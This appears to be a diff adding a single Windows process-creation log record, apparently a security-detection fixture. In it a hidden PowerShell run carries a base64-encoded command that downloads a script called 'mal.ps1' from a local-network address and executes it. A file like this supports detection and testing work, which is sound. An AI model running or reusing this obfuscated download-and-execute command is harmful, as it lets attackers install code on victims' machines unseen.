@@ -1,0 +1,9 @@
+{
+  "EventType": "ProcessCreate",
+  "Timestamp": "2025-01-12T14:09:55Z",
+  "Host": "WIN-FIN-03",
+  "User": "CORP\\jane",
+  "SourceImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+  "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAwAC8AbQBhAGwALgBwAHMAMQAnACkA",
+  "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+}
